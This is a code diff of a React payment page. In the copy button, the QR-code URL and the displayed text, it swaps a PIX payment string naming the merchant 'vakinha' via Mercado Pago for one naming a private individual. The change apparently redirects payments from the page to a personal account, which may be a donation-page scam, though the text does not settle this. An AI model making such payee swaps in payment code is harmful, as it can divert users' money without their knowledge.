@@ -605,7 +605,7 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
   const [copied, setCopied] = useState(false);
 
   const handleCopy = () => {
-    navigator.clipboard.writeText('00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com/instore/ol/v2/3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO PAULO62080504mpis6304C070');
+    navigator.clipboard.writeText('00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E');
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
   };
@@ -666,12 +666,12 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
               </div>
 
               <div className="p-4 bg-white border-2 border-green-100 rounded-2xl shadow-sm">
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com%2Finstore%2Fol%2Fv2%2F3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO%20PAULO62080504mpis6304C070" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO%20R%20DA%20S%20SOUSA6008TRINDADE62070503***63045F6E" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
               </div>
               
               <div className="w-full space-y-3">
                 <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center font-mono text-gray-800 font-bold break-all text-sm">
-                  00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com/instore/ol/v2/3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO PAULO62080504mpis6304C070
+                  00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E
                 </div>
                 <button 
                   onClick={handleCopy}
